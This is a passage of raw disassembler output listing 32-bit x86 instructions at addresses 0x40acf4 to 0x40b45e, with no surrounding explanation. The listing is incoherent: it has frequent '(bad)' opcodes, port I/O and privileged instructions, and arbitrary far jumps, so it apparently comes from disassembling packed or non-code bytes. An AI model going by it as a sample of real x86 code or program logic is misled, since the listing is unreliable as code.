  40acf4:	sbb    ch,BYTE PTR [esi]
  40acf6:	pop    ebp
  40acf7:	push   ebp
  40acf8:	fcomp  DWORD PTR [eax+0x30587e74]
  40acfe:	fcomip st,st(3)
  40ad00:	add    cl,BYTE PTR [ebx-0x6cb970]
  40ad06:	xchg   edi,eax
  40ad07:	or     DWORD PTR [edi+0x77],eax
  40ad0a:	or     dh,dh
  40ad0c:	xor    DWORD PTR [eax],ebp
  40ad0e:	push   ds
  40ad0f:	into   
  40ad10:	dec    esp
  40ad11:	enter  0x45ec,0x58
  40ad15:	inc    ecx
  40ad16:	xchg   DWORD PTR [ebp-0x51f73169],esi
  40ad1c:	sar    BYTE PTR [esi-0x6b],cl
  40ad1f:	sbb    DWORD PTR [esi-0x755a0c2f],ebx
  40ad25:	ins    DWORD PTR es:[edi],dx
  40ad26:	leave  
  40ad27:	inc    esi
  40ad28:	cmp    DWORD PTR [edi-0x53],0xfffffff6
  40ad2c:	mov    al,BYTE PTR [eax-0x50]
  40ad2f:	mov    bh,0x3d
  40ad31:	inc    esp
  40ad32:	and    bh,bl
  40ad34:	mov    BYTE PTR [ebx],dl
  40ad36:	sub    BYTE PTR [ecx],bl
  40ad38:	xchg   esi,eax
  40ad39:	pop    ds
  40ad3a:	or     bh,BYTE PTR [esp+ebp*8]
  40ad3d:	(bad)  
  40ad3e:	repnz lods eax,DWORD PTR ds:[esi]
  40ad40:	jno    0x40ad17
  40ad42:	lahf   
  40ad43:	leave  
  40ad44:	jbe    0x40adbe
  40ad46:	jecxz  0x40ad9e
  40ad48:	(bad)  
  40ad49:	add    al,0x93
  40ad4b:	ins    BYTE PTR es:[edi],dx
  40ad4c:	outs   dx,DWORD PTR ds:[esi]
  40ad4d:	mov    cl,BYTE PTR [edi]
  40ad4f:	push   ss
  40ad50:	daa    
  40ad51:	or     al,0x19
  40ad53:	nop
  40ad54:	imul   edi,DWORD PTR [ebx+0x3],0xd35e906c
  40ad5b:	cwde   
  40ad5c:	out    dx,eax
  40ad5d:	in     eax,0x96
  40ad5f:	push   ds
  40ad60:	(bad)  
  40ad62:	sub    cl,bl
  40ad64:	xor    cl,BYTE PTR [ecx-0x1f9aa7c2]
  40ad6a:	pop    ebx
  40ad6b:	xor    BYTE PTR [edi],al
  40ad6d:	mov    ds:0x316ba7e3,eax
  40ad72:	inc    ebx
  40ad73:	jne    0x40ad90
  40ad75:	and    BYTE PTR [esi],0x33
  40ad78:	mov    bh,0x66
  40ad7a:	fsub   QWORD PTR [ebp+0x3a]
  40ad7d:	(bad)  
  40ad7e:	pop    esi
  40ad7f:	sub    DWORD PTR [ecx+0x5877054c],ebx
  40ad85:	sbb    esp,DWORD PTR [ebx]
  40ad87:	add    eax,0x54bcc049
  40ad8c:	icebp  
  40ad8d:	rcr    DWORD PTR [ebx+0x1c],0x30
  40ad91:	lock xor DWORD PTR [ecx+0x3a738290],ebx
  40ad98:	jl     0x40ad2b
  40ad9a:	jecxz  0x40adb0
  40ad9c:	xchg   edx,eax
  40ad9d:	xor    al,0xf7
  40ad9f:	cwde   
  40ada0:	loopne 0x40ad3b
  40ada2:	leave  
  40ada3:	mov    WORD PTR [edi+eiz*4-0x26],cs
  40ada7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ada8:	sub    DWORD PTR [esi-0x4a],edi
  40adab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adac:	push   edi
  40adad:	out    0x6f,eax
  40adaf:	mov    esp,0xe7d3495f
  40adb4:	jo     0x40ae35
  40adb6:	inc    eax
  40adb7:	jg     0x40adfa
  40adb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adba:	jmp    0xf62d:0x8dc141eb
  40adc1:	xor    DWORD PTR [eax-0x1f],0x2838a387
  40adc8:	push   esi
  40adc9:	xchg   ebx,eax
  40adca:	js     0x40ad70
  40adcc:	pop    ebp
  40adcd:	fwait
  40adce:	ja     0x40ada1
  40add0:	outs   dx,BYTE PTR ds:[esi]
  40add1:	sub    DWORD PTR [ebp+0x45],ebx
  40add4:	add    bl,ch
  40add6:	mov    ebp,DWORD PTR [ebx-0x35]
  40add9:	mov    esp,0xa2e17bd0
  40adde:	gs push 0x8143e764
  40ade4:	add    bl,BYTE PTR [ecx+0x7f57b837]
  40adea:	sub    DWORD PTR [edi+0x62],ebx
  40aded:	xor    ebx,DWORD PTR [edx+0x6e92cfcd]
  40adf3:	(bad)  
  40adf4:	cdq    
  40adf5:	jmp    0x9107af55
  40adfa:	mov    ebx,0xb73ac09a
  40adff:	xor    eax,0x3fc3bfe3
  40ae04:	icebp  
  40ae05:	dec    esp
  40ae06:	les    ebx,FWORD PTR [edi]
  40ae08:	test   al,0x64
  40ae0a:	int    0x6a
  40ae0c:	(bad)
  40ae0f:	les    ebp,FWORD PTR [eax]
  40ae11:	lds    edx,FWORD PTR [ebx+0x35a105a]
  40ae17:	xchg   DWORD PTR [ecx+esi*1-0x75],esi
  40ae1b:	call   0x40f99d04
  40ae20:	push   ebx
  40ae21:	shr    ebp,1
  40ae23:	les    edi,FWORD PTR [ecx+0x48517420]
  40ae29:	icebp  
  40ae2a:	jp     0x40adb0
  40ae2c:	pop    eax
  40ae2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae2e:	mov    esi,ss
  40ae30:	jbe    0x40adda
  40ae32:	in     eax,dx
  40ae33:	repz ja 0x40ae80
  40ae36:	pop    ecx
  40ae37:	rcl    bl,1
  40ae39:	stos   BYTE PTR es:[edi],al
  40ae3a:	sbb    BYTE PTR [edi+0x1a],dh
  40ae3d:	test   edx,esp
  40ae3f:	in     al,dx
  40ae40:	out    dx,al
  40ae41:	jg     0x40ae5f
  40ae43:	daa    
  40ae44:	fadd   st,st(5)
  40ae46:	jl     0x40ae4d
  40ae48:	xchg   edx,eax
  40ae49:	mov    ss,WORD PTR [eax]
  40ae4b:	jecxz  0x40ae50
  40ae4d:	mov    gs,WORD PTR [eax]
  40ae4f:	mov    DWORD PTR [edi+0x610552b],0x72439b8d
  40ae59:	outs   dx,DWORD PTR ds:[esi]
  40ae5a:	xor    al,0x71
  40ae5c:	adc    eax,0x4308f403
  40ae61:	in     al,0x14
  40ae63:	xchg   ebp,eax
  40ae64:	(bad)  
  40ae65:	push   ecx
  40ae66:	imul   edi,DWORD PTR [ebx+0x25],0xfffffff9
  40ae6a:	mov    DWORD PTR [esi-0xc],edi
  40ae6d:	jge    0x40ae17
  40ae6f:	out    dx,eax
  40ae70:	sub    cl,BYTE PTR [edx+ebp*4]
  40ae73:	loop   0x40ae0c
  40ae75:	mov    esp,0x4c0d7d0d
  40ae7a:	push   ds
  40ae7b:	adc    ch,BYTE PTR ds:0x2a24b669
  40ae81:	hlt    
  40ae82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae83:	jns    0x40aebd
  40ae85:	sub    eax,0x49611900
  40ae8a:	mov    ch,0x34
  40ae8c:	cli    
  40ae8d:	xchg   ebp,eax
  40ae8e:	sub    eax,DWORD PTR ds:0xaeb7f317
  40ae94:	mov    al,BYTE PTR [ebp+0x18]
  40ae97:	dec    eax
  40ae98:	mov    al,ds:0xb0114b43
  40ae9d:	inc    ebp
  40ae9e:	aam    0x88
  40aea0:	mov    esp,DWORD PTR [esi]
  40aea2:	enter  0xf280,0xdb
  40aea6:	lock adc al,0x6d
  40aea9:	retf   0x94c4
  40aeac:	cmp    BYTE PTR gs:[esi],cl
  40aeaf:	jle    0x40ae45
  40aeb1:	shl    BYTE PTR [esi-0x6a87e00],1
  40aeb7:	cmc    
  40aeb8:	push   ss
  40aeb9:	add    al,0xdd
  40aebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aebc:	add    DWORD PTR [edi],edx
  40aebe:	mov    esi,DWORD PTR [esp+edi*8-0x3ecd14cb]
  40aec5:	loope  0x40ae96
  40aec7:	dec    esp
  40aec8:	(bad)  
  40aec9:	mov    edi,0xc1de7a3
  40aece:	and    eax,0x61d759d5
  40aed3:	xor    eax,eax
  40aed5:	and    DWORD PTR [edx],ebp
  40aed7:	adc    eax,0x36c89c
  40aedc:	loope  0x40ae69
  40aede:	fnstenv [edi+0x4741b0f]
  40aee4:	shl    DWORD PTR [edx],0xef
  40aee7:	popf   
  40aee8:	popa   
  40aee9:	xchg   cl,dl
  40aeeb:	dec    eax
  40aeec:	hlt    
  40aeed:	leave  
  40aeee:	xor    ah,BYTE PTR ds:0xa59486c9
  40aef4:	data16 shr BYTE PTR [ebx-0xd97c349],cl
  40aefb:	stos   BYTE PTR es:[edi],al
  40aefc:	sub    cl,BYTE PTR [eax+0x7b]
  40aeff:	daa    
  40af00:	fist   DWORD PTR [eax]
  40af02:	stos   BYTE PTR es:[edi],al
  40af03:	dec    edi
  40af04:	xor    eax,0xa4a70170
  40af09:	sub    eax,0xa0939146
  40af0e:	fwait
  40af0f:	jb     0x40aeea
  40af11:	(bad)  
  40af12:	mov    ds:0x7e5f3251,eax
  40af17:	inc    eax
  40af18:	retf   0x9a01
  40af1b:	loopne 0x40af1b
  40af1d:	push   esi
  40af1e:	mov    ebx,0xd4bf6083
  40af23:	or     BYTE PTR [eax+0x79],bl
  40af26:	mov    eax,ds:0x8585d60d
  40af2b:	xchg   esp,eax
  40af2c:	jmp    0x40af16
  40af2e:	mov    ecx,0xf2b9c8bb
  40af33:	inc    ebp
  40af34:	jecxz  0x40af31
  40af36:	scas   eax,DWORD PTR es:[edi]
  40af37:	xor    eax,0xde687a02
  40af3c:	mov    ds:0x9110117,eax
  40af41:	unpcklps xmm0,XMMWORD PTR [ecx-0x63192a7d]
  40af48:	call   0x1e8f7f25
  40af4d:	mov    ds:0x67df75c2,al
  40af52:	jmp    0x40af15
  40af54:	div    ebp
  40af56:	pop    es
  40af57:	cmp    ecx,DWORD PTR [esi]
  40af59:	cli    
  40af5a:	ffree  st(4)
  40af5c:	ret    
  40af5d:	or     bh,0x15
  40af60:	in     al,0x2d
  40af62:	sub    al,0x48
  40af64:	mov    DWORD PTR [ebx+0x7696fef5],ebp
  40af6a:	fisubr WORD PTR [edx*2-0x6f8f01a]
  40af71:	outs   dx,DWORD PTR ds:[esi]
  40af72:	push   0xa38406bf
  40af77:	fsubr  QWORD PTR [esi-0x63]
  40af7a:	cmp    DWORD PTR [edx-0x6120da22],ebx
  40af80:	sbb    ch,BYTE PTR [esp+eax*2]
  40af83:	cmp    al,0xf8
  40af85:	cdq    
  40af86:	or     eax,0x26ca79cb
  40af8b:	jno    0x40afd3
  40af8d:	int    0x2
  40af8f:	aad    0x23
  40af91:	cmc    
  40af92:	jno    0x40af37
  40af94:	lahf   
  40af95:	push   esi
  40af96:	xchg   ecx,eax
  40af97:	ficomp DWORD PTR [ebx+0x33]
  40af9a:	dec    eax
  40af9b:	addr16 pushf 
  40af9d:	cs pop eax
  40af9f:	arpl   WORD PTR [edi-0x3],di
  40afa2:	xor    BYTE PTR [ecx-0x2d],ah
  40afa5:	(bad)  
  40afa6:	icebp  
  40afa7:	in     al,0xe7
  40afa9:	data16 (bad) [edi]
  40afac:	jnp    0x40af66
  40afae:	cmp    BYTE PTR [ebx],ch
  40afb0:	push   ss
  40afb1:	stos   DWORD PTR es:[edi],eax
  40afb2:	push   0xb6e68d6c
  40afb7:	jns    0x40af59
  40afb9:	or     al,0xdd
  40afbb:	rep ins WORD PTR es:[edi],dx
  40afbe:	adc    al,BYTE PTR [edx+0x27]
  40afc1:	fist   WORD PTR [ebx+0x39d6a41a]
  40afc7:	loop   0x40b00e
  40afc9:	pop    esp
  40afca:	mov    cl,0x5f
  40afcc:	mov    edx,0x54cc35ba
  40afd1:	fwait
  40afd2:	imul   edx,edx,0xba0b6c5f
  40afd8:	loopne 0x40af7a
  40afda:	cmp    al,BYTE PTR gs:[ecx-0x2e]
  40afde:	popf   
  40afdf:	mov    BYTE PTR [edx+0x38bbb614],ch
  40afe5:	push   0x824e7a12
  40afea:	xchg   ecx,eax
  40afeb:	sub    BYTE PTR [ecx+0x335849e2],bl
  40aff1:	test   BYTE PTR [ecx+0x62],0xe4
  40aff5:	inc    esi
  40aff6:	push   es
  40aff7:	jle    0x40af84
  40aff9:	jb     0x40b03a
  40affb:	push   es
  40affc:	aad    0x73
  40affe:	fwait
  40afff:	std    
  40b000:	imul   edi,edx,0xe20dcdcf
  40b006:	test   dh,bh
  40b008:	mov    ebx,0x51969015
  40b00d:	mov    edx,edx
  40b00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b010:	mov    WORD PTR [edi*8-0x3d68a5dd],?
  40b017:	(bad)  
  40b018:	pushf  
  40b019:	sbb    esp,DWORD PTR [edi-0x52]
  40b01c:	mov    ebp,0xb885f820
  40b021:	inc    edi
  40b022:	mov    al,0x93
  40b024:	cli    
  40b025:	mov    al,0xb1
  40b027:	or     dh,BYTE PTR [ecx-0x10]
  40b02a:	enter  0x3d03,0x84
  40b02e:	adc    BYTE PTR [eax],dh
  40b030:	(bad)  
  40b031:	cli    
  40b032:	add    BYTE PTR [esi+0x4699d81d],dh
  40b038:	and    DWORD PTR [esi],0x19
  40b03b:	mov    ecx,DWORD PTR [eax-0x442179f3]
  40b041:	dec    ebx
  40b042:	fst    QWORD PTR [ebp-0x4df27fb5]
  40b048:	mov    eax,ds:0x94247eb4
  40b04d:	adc    cl,BYTE PTR [edi+0xe7d0e09]
  40b053:	xlat   BYTE PTR ds:[ebx]
  40b054:	xchg   edi,eax
  40b055:	push   ds
  40b056:	shl    edx,0x24
  40b059:	in     al,0x74
  40b05b:	pop    ebx
  40b05c:	iret   
  40b05d:	pushf  
  40b05e:	mov    ecx,0xb34d1d0f
  40b063:	ror    DWORD PTR [ecx+0x4],1
  40b066:	push   ebp
  40b067:	bound  esi,QWORD PTR [ebx]
  40b069:	or     cl,BYTE PTR [eax]
  40b06b:	dec    eax
  40b06c:	jb     0x40b0d3
  40b06e:	mov    ecx,0xff9ddcb0
  40b073:	jge    0x40b099
  40b075:	bound  esp,QWORD PTR [edx]
  40b077:	scas   eax,DWORD PTR es:[edi]
  40b078:	cwde   
  40b079:	and    eax,0xaa358468
  40b07e:	es adc eax,0x89c176c0
  40b084:	fiadd  DWORD PTR [edi]
  40b086:	or     ecx,0xfeeb6ccd
  40b08c:	arpl   WORD PTR [eax+0x5f],si
  40b08f:	lahf   
  40b090:	into   
  40b091:	sub    eax,0x6b77b6b6
  40b096:	lea    edx,[edx+esi*8+0x1a]
  40b09a:	cmp    dh,BYTE PTR [esi+ebx*1-0x35]
  40b09e:	sahf   
  40b09f:	fcom   DWORD PTR [ebp+0x1b]
  40b0a2:	mov    bh,0x1
  40b0a4:	cmp    edx,DWORD PTR [ebx+esi*4-0x24]
  40b0a8:	jns    0x40b096
  40b0aa:	fsubr  st,st(5)
  40b0ac:	adc    cl,BYTE PTR [ebp-0x46]
  40b0af:	(bad)  
  40b0b0:	pushf  
  40b0b1:	adc    eax,0xe7cb5b5f
  40b0b6:	cdq    
  40b0b7:	inc    edi
  40b0b8:	shr    DWORD PTR [esi],cl
  40b0ba:	pushf  
  40b0bb:	sbb    al,0xdf
  40b0bd:	and    eax,0x8b2fea54
  40b0c2:	and    al,0x26
  40b0c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0c5:	iret   
  40b0c6:	stos   BYTE PTR es:[edi],al
  40b0c7:	jmp    0x83ab:0xd573d2ba
  40b0ce:	test   ch,0x75
  40b0d1:	ror    DWORD PTR [ebx+0x53fcd8b6],1
  40b0d7:	sbb    eax,0x27510af5
  40b0dc:	ins    BYTE PTR es:[edi],dx
  40b0dd:	scas   al,BYTE PTR es:[edi]
  40b0de:	push   ebx
  40b0df:	mov    ecx,0xaea2f96e
  40b0e4:	inc    esp
  40b0e5:	(bad)  
  40b0e6:	sti    
  40b0e7:	out    0x6,al
  40b0e9:	dec    esp
  40b0ea:	mov    ss,WORD PTR [ecx-0x54c56544]
  40b0f0:	out    dx,eax
  40b0f1:	add    al,0x73
  40b0f3:	jns    0x40b0d5
  40b0f5:	cmp    cl,BYTE PTR [ebp+0x37cf3e7b]
  40b0fb:	xlat   BYTE PTR ds:[ebx]
  40b0fc:	mov    edi,0x40a5f2f9
  40b101:	mov    ah,BYTE PTR [edi+0x67]
  40b104:	jg     0x40b0a7
  40b106:	inc    ecx
  40b107:	inc    esi
  40b108:	mov    esi,0xff9449f6
  40b10d:	mov    bh,BYTE PTR [ecx+0x13ccf1e9]
  40b113:	in     eax,dx
  40b114:	mov    eax,0xb6df23a8
  40b119:	js     0x40b0f9
  40b11b:	js     0x40b0a0
  40b11d:	mov    cl,0x58
  40b11f:	test   al,0xaa
  40b121:	xchg   esi,eax
  40b122:	sub    DWORD PTR [edx],ebp
  40b124:	rcl    BYTE PTR [edx],1
  40b126:	mov    eax,ds:0xa6a81e1a
  40b12b:	lahf   
  40b12c:	push   ss
  40b12d:	or     BYTE PTR [esi],0xfa
  40b130:	inc    edi
  40b131:	mov    ch,0x9a
  40b133:	test   al,0x53
  40b135:	jmp    0x18d7:0x8f88adb3
  40b13c:	adc    eax,0xf4a64248
  40b141:	adc    al,0xd5
  40b143:	mov    dl,0xb6
  40b145:	push   ecx
  40b146:	pop    ds
  40b147:	xchg   ebx,eax
  40b148:	out    dx,eax
  40b149:	push   edx
  40b14a:	js     0x40b143
  40b14c:	or     al,0x98
  40b14e:	mov    esi,0xc373a963
  40b153:	mov    WORD PTR [ebp-0x55],ds
  40b156:	xlat   BYTE PTR ds:[ebx]
  40b157:	js     0x40b116
  40b159:	cwde   
  40b15a:	stos   DWORD PTR es:[edi],eax
  40b15b:	add    DWORD PTR [edi-0x16d23045],esi
  40b161:	jecxz  0x40b1c2
  40b163:	aam    0xdd
  40b165:	out    0xd6,al
  40b167:	imul   ebp,ecx,0xfce6a1bc
  40b16d:	mov    WORD PTR [eax-0x3cbc9965],es
  40b173:	(bad)  [edi+0x6e]
  40b176:	inc    ebp
  40b177:	repnz push 0xfffffff7
  40b17a:	or     al,0xd3
  40b17d:	(bad)  
  40b17e:	jmp    0xb3c6f8ea
  40b183:	pop    ds
  40b184:	jg     0x40b140
  40b186:	nop
  40b187:	(bad)  
  40b189:	int    0xdd
  40b18b:	sub    al,0x30
  40b18d:	enter  0xb7ab,0x60
  40b191:	fs dec edx
  40b193:	nop
  40b194:	mov    al,0xfa
  40b196:	test   BYTE PTR [ebx+0x6a],cl
  40b199:	dec    edx
  40b19a:	adc    ecx,esi
  40b19c:	shl    DWORD PTR [ebp-0x1],cl
  40b19f:	push   ecx
  40b1a0:	stos   BYTE PTR es:[edi],al
  40b1a1:	dec    edx
  40b1a2:	js     0x40b1fb
  40b1a4:	inc    esp
  40b1a5:	jb     0x40b1ad
  40b1a7:	aas    
  40b1a8:	add    eax,0xe190ddd5
  40b1ad:	inc    edx
  40b1ae:	push   es
  40b1af:	or     BYTE PTR [ecx],0x65
  40b1b2:	pop    eax
  40b1b3:	aam    0x5e
  40b1b5:	dec    esi
  40b1b6:	adc    al,0x26
  40b1b8:	xlat   BYTE PTR ds:[ebx]
  40b1b9:	outs   dx,BYTE PTR ds:[esi]
  40b1ba:	dec    esp
  40b1bb:	inc    eax
  40b1bc:	fs pop edx
  40b1be:	ror    DWORD PTR [eax+0x789b97c5],1
  40b1c4:	lds    esi,FWORD PTR [edx-0x1b7a9543]
  40b1ca:	jg     0x40b244
  40b1cc:	into   
  40b1cd:	cmp    eax,0xfa0dd979
  40b1d2:	retf   0x8d2f
  40b1d5:	test   eax,0x37be2326
  40b1da:	fimul  WORD PTR [edx+0x42]
  40b1dd:	int    0x2f
  40b1df:	test   eax,0xcf157237
  40b1e4:	xchg   esp,eax
  40b1e5:	xor    BYTE PTR [edx-0x3b602d95],ah
  40b1eb:	cmp    BYTE PTR [edx],0x93
  40b1ee:	mov    ah,0x40
  40b1f0:	imul   esi,DWORD PTR [edx+ebx*1],0x60d80bf
  40b1f7:	mov    ebp,0x9819e2f3
  40b1fc:	adc    DWORD PTR [eax-0x5f546674],ebp
  40b202:	(bad)  
  40b205:	jle    0x40b1c8
  40b207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b208:	mov    cl,0x6a
  40b20a:	add    eax,0xf1db1bcf
  40b20f:	pop    ebp
  40b210:	pop    ebp
  40b211:	push   edx
  40b212:	add    DWORD PTR [edx-0x28082f8c],0x9802fc56
  40b21c:	sbb    eax,0x5ff422ab
  40b221:	movzx  ebp,BYTE PTR [ecx+ebx*2+0x611c8401]
  40b229:	sub    eax,0xe0cb00f4
  40b22e:	(bad)  
  40b22f:	sbb    edi,ecx
  40b231:	inc    esi
  40b232:	mul    DWORD PTR [esi+0x73]
  40b235:	jb     0x40b276
  40b237:	jle    0x40b28b
  40b239:	mov    ch,0xa
  40b23b:	mov    ?,WORD PTR [edi-0x2194cf12]
  40b241:	push   0xe353ee2b
  40b246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b247:	mov    DWORD PTR ds:0x8a523582,eax
  40b24d:	xor    eax,edx
  40b24f:	(bad)  
  40b250:	fdivr  DWORD PTR [eax+edx*4+0x2742b717]
  40b257:	out    0xa0,eax
  40b259:	sub    eax,0x9756a288
  40b25e:	mov    esi,DWORD PTR [edx+eiz*8-0x75]
  40b262:	xor    esi,DWORD PTR [edi+0x9]
  40b265:	add    ch,BYTE PTR ds:0x23c74d44
  40b26b:	xchg   edi,eax
  40b26c:	sub    al,BYTE PTR [esi-0xad2617]
  40b272:	pop    edi
  40b273:	push   esi
  40b274:	mov    ebx,0x990f3f57
  40b279:	(bad)  
  40b27a:	daa    
  40b27b:	out    0x76,al
  40b27d:	icebp  
  40b27e:	hlt    
  40b27f:	jle    0x40b2eb
  40b281:	jb     0x40b254
  40b283:	imul   ebp,esi,0x8455add8
  40b289:	icebp  
  40b28a:	cmp    eax,0xabf68ded
  40b28f:	add    DWORD PTR [ecx+0x42b552cd],esi
  40b295:	jno    0x40b2e4
  40b297:	xor    bl,dh
  40b299:	mov    ebx,0x96fa720e
  40b29e:	sbb    DWORD PTR [esi+0x38],ecx
  40b2a1:	out    dx,eax
  40b2a2:	mov    ch,0x9c
  40b2a4:	and    cl,BYTE PTR [eax]
  40b2a6:	dec    edx
  40b2a7:	in     al,0xa5
  40b2a9:	mov    esp,0x2c9d0227
  40b2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2af:	cli    
  40b2b0:	add    DWORD PTR [edi],ebx
  40b2b2:	xchg   edx,eax
  40b2b3:	jae    0x40b2f2
  40b2b5:	push   ebx
  40b2b6:	je     0x40b243
  40b2b8:	sbb    DWORD PTR ds:0x802685c2,edi
  40b2be:	and    eax,0x1bae2c5d
  40b2c3:	stos   DWORD PTR es:[edi],eax
  40b2c4:	dec    edi
  40b2c5:	or     bl,BYTE PTR [ebx+0x21]
  40b2c8:	ds jge 0x40b338
  40b2cb:	xchg   esp,eax
  40b2cc:	xchg   ebp,eax
  40b2cd:	or     DWORD PTR [esi-0x4f],edi
  40b2d0:	cwde   
  40b2d1:	adc    BYTE PTR [ebp-0x5d83ab8c],ch
  40b2d7:	gs mov esi,0xafd2fc82
  40b2dd:	push   ebx
  40b2de:	mov    al,0xfe
  40b2e0:	lahf   
  40b2e1:	in     eax,dx
  40b2e2:	ins    DWORD PTR es:[edi],dx
  40b2e3:	leave  
  40b2e4:	sbb    eax,0x59169c6
  40b2e9:	fs xchg edi,eax
  40b2eb:	jns    0x40b33e
  40b2ed:	sub    DWORD PTR [ebp+0x75],ebx
  40b2f0:	rol    DWORD PTR [ebx],0x74
  40b2f3:	or     cl,BYTE PTR [ecx+0x1cb79f78]
  40b2f9:	fiadd  DWORD PTR ds:0x972a5814
  40b2ff:	sub    eax,0x64f6f2e6
  40b304:	xor    dl,BYTE PTR [edx]
  40b306:	sti    
  40b307:	inc    eax
  40b308:	xchg   ch,dh
  40b30a:	mov    dh,0xe3
  40b30c:	out    0x6f,eax
  40b30e:	ficomp DWORD PTR [edi-0x3972e1a8]
  40b314:	das    
  40b315:	hlt    
  40b316:	xchg   ebx,eax
  40b317:	addr16 mov bl,0xea
  40b31a:	fst    st(6)
  40b31c:	push   cs
  40b31d:	pop    ecx
  40b31e:	fisubr DWORD PTR [eiz*4+0x7a4e3c45]
  40b325:	ins    BYTE PTR es:[edi],dx
  40b326:	xor    esi,DWORD PTR [eax+edi*1]
  40b329:	mov    ecx,0x403897d9
  40b32e:	inc    esp
  40b32f:	xchg   ebp,eax
  40b330:	or     ebp,DWORD PTR [eax]
  40b332:	mov    esp,0xae8f570a
  40b337:	ins    DWORD PTR es:[edi],dx
  40b338:	push   ebp
  40b339:	inc    esi
  40b33a:	and    ch,BYTE PTR [edi-0x20457b3f]
  40b340:	scas   eax,DWORD PTR es:[edi]
  40b341:	gs pop ds
  40b343:	stos   BYTE PTR es:[edi],al
  40b344:	add    eax,0x81a8c9e
  40b349:	int3   
  40b34a:	ror    dl,0x3a
  40b34d:	(bad)  
  40b34e:	jecxz  0x40b320
  40b350:	adc    eax,0x9f0a9a75
  40b355:	dec    esp
  40b356:	xor    DWORD PTR [ebx+eax*1],eax
  40b359:	imul   edi,DWORD PTR [ecx-0x61],0x2fa9f851
  40b360:	pop    edi
  40b361:	add    ebp,0xe449559e
  40b367:	mov    edx,0x2415791b
  40b36c:	push   eax
  40b36d:	add    bh,BYTE PTR [edi+0x34]
  40b370:	dec    edi
  40b371:	xchg   edi,eax
  40b372:	xchg   edi,eax
  40b373:	sbb    DWORD PTR [edi],ebp
  40b375:	(bad)  
  40b376:	cld    
  40b377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b378:	out    dx,eax
  40b379:	inc    ebp
  40b37a:	dec    esp
  40b37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b37c:	out    dx,al
  40b37d:	fld    QWORD PTR [eax]
  40b37f:	and    esp,eax
  40b381:	mov    esp,?
  40b383:	sub    al,0x5
  40b385:	or     al,BYTE PTR [eax-0x54]
  40b388:	push   ebp
  40b389:	bound  edi,QWORD PTR fs:[eax+0x1b]
  40b38d:	sub    cl,BYTE PTR [edi-0x7046a850]
  40b393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b394:	jns    0x40b3dd
  40b396:	loope  0x40b367
  40b398:	lock loopne 0x40b34e
  40b39b:	scas   al,BYTE PTR es:[edi]
  40b39c:	mov    ebp,0x5bca7a5a
  40b3a1:	xlat   BYTE PTR ds:[ebx]
  40b3a2:	jne    0x40b326
  40b3a4:	jg     0x40b3e9
  40b3a6:	xlat   BYTE PTR ds:[ebx]
  40b3a7:	loopne 0x40b342
  40b3a9:	test   DWORD PTR [ecx-0x59],0x8a960a03
  40b3b0:	cdq    
  40b3b1:	jne    0x40b3bb
  40b3b3:	neg    bl
  40b3b5:	sub    al,0x5e
  40b3b7:	retf   
  40b3b8:	inc    esp
  40b3b9:	xchg   DWORD PTR [ebx],edx
  40b3bb:	xor    eax,DWORD PTR [edx-0x3a]
  40b3be:	out    dx,al
  40b3bf:	mov    ch,0xb7
  40b3c1:	add    ah,dh
  40b3c3:	popa   
  40b3c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3c5:	mov    ah,0xd3
  40b3c7:	popf   
  40b3c8:	sbb    al,0x60
  40b3ca:	jno    0x40b3dc
  40b3cc:	lods   al,BYTE PTR ds:[esi]
  40b3cd:	dec    eax
  40b3ce:	inc    edx
  40b3cf:	mov    eax,ds:0x422c66a2
  40b3d4:	adc    eax,0xf1a6f1b6
  40b3d9:	fwait
  40b3da:	mov    esp,0xb81ccc7b
  40b3df:	test   BYTE PTR [edi+0x26435f1e],0xd7
  40b3e6:	lods   al,BYTE PTR ds:[esi]
  40b3e7:	dec    edx
  40b3e8:	ds or  dl,dh
  40b3eb:	scas   eax,DWORD PTR es:[edi]
  40b3ec:	jecxz  0x40b380
  40b3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ef:	(bad)  
  40b3f0:	fisttp QWORD PTR [edi]
  40b3f2:	adc    dh,dh
  40b3f4:	aaa    
  40b3f5:	dec    ecx
  40b3f6:	popa   
  40b3f7:	add    ecx,eax
  40b3f9:	inc    ebx
  40b3fa:	arpl   WORD PTR [edi-0x49f59859],bp
  40b400:	sti    
  40b401:	cdq    
  40b402:	daa    
  40b403:	scas   al,BYTE PTR es:[edi]
  40b404:	mov    cl,0xad
  40b406:	rcr    BYTE PTR [ebx+ecx*2+0x58],1
  40b40a:	mov    bl,0x92
  40b40c:	enter  0xede,0x2c
  40b410:	add    al,ah
  40b412:	lahf   
  40b413:	repnz cli 
  40b415:	mov    edx,0x8cf19501
  40b41a:	int    0x42
  40b41c:	mov    eax,ds:0xbaeff651
  40b421:	add    esi,ebx
  40b423:	xchg   cl,bl
  40b425:	sbb    ebp,DWORD PTR [bp+0x79]
  40b429:	fst    QWORD PTR [ebx+eiz*1+0x7567d4a7]
  40b430:	loope  0x40b456
  40b432:	sub    bl,al
  40b434:	retf   0x3d08
  40b437:	test   al,0x7f
  40b439:	shl    BYTE PTR [eax-0x2b31b757],cl
  40b43f:	jmp    0xa9f3:0x965509bd
  40b446:	inc    edx
  40b447:	xor    bh,BYTE PTR [esi]
  40b449:	lods   eax,DWORD PTR ds:[esi]
  40b44a:	into   
  40b44b:	xor    bh,ch
  40b44d:	(bad)  
  40b44e:	and    al,0xfa
  40b450:	cs pop edi
  40b452:	add    eax,0x79192cb2
  40b457:	and    al,0xb8
  40b459:	mov    bl,0xb7
  40b45b:	lods   eax,DWORD PTR ds:[esi]
  40b45c:	(bad)  
  40b45d:	push   cs
  40b45e:	sub    eax,0x2e9bf9da
